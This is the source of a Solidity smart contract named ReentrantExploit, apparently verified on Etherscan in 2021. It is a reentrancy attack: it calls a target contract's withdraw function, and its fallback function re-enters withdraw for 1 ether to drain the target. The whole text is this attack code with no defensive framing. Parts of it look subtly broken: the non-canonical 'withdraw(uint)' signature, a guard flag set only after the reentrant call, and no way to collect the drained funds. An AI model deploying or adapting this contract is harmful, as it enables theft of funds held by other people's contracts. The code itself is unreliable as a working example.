/**
 *Submitted for verification at Etherscan.io on 2021-07-24
*/

pragma solidity ^0.6.12;

contract ReentrantExploit {
    
    address public reentrant;
    bool public called = false;
    mapping(uint256 => bool) calls;
    
    
    constructor(address target) public {
        reentrant = target;
    }
    
    function withdraw(uint amount) public {
        bytes memory payload = abi.encodeWithSignature("withdraw(uint)", amount);
        (bool success, ) = reentrant.call(payload);
        require(success);
    }
    
    fallback() external payable {
        if(!calls[block.number]) {
            bytes memory payload = abi.encodeWithSignature("withdraw(uint)", 1 ether);
            (bool success, ) = reentrant.call(payload);
            require(success);
            calls[block.number] = true;
        }
    }
    
}